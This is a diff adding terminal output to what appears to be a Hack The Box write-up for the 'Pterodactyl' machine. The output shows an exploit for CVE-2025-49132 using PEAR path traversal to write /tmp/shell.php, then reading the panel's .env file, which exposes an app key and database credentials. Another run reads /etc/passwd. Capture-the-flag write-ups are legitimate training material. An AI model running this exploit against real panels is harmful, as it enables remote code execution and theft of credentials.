@@ -404,6 +404,50 @@ found: [https://github.com/Ahmedf000/CVE-2025-49132_HTB_SEASON10]
 [https://cvefeed.io/vuln/detail/CVE-2025-49132]
 
 ```
+ajdev@rootbox:~/HTB/Pterodactyl$ python3 exploit.py --host panel.pterodactyl.htb --command "cat /var/www/pterodactyl/.env"
+
+╔═══════════════════════════════════════════════════════════╗
+║           CVE-2025-49132 PEAR RCE Exploit                ║
+║           Target: panel.pterodactyl.htb                       ║
+╚═══════════════════════════════════════════════════════════╝
+
+[*] Target: http://panel.pterodactyl.htb
+[*] PEAR Path: ../../../../../../usr/share/php/PEAR
+[*] Command: cat /var/www/pterodactyl/.env
+
+[*] Writing payload to /tmp/shell.php...
+[+] Payload written
+[*] Executing payload...
+[+] Command executed successfully!
+
+============================================================
+OUTPUT:
+============================================================
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:123:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/APP_ENV=production
+APP_DEBUG=false
+APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
+APP_THEME=pterodactyl
+APP_TIMEZONE=UTC
+APP_URL="http://panel.pterodactyl.htb"
+APP_LOCALE=en
+APP_ENVIRONMENT_ONLY=false
+
+LOG_CHANNEL=daily
+LOG_DEPRECATIONS_CHANNEL=null
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=panel
+DB_USERNAME=pterodactyl
+DB_PASSWORD=PteraP
+============================================================
+ajdev@rootbox:~/HTB/Pterodactyl$
+```
+
+```
 $ ./exploit.sh cmd "cat /etc/passwd"
 [*] Executing: cat /etc/passwd
 nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
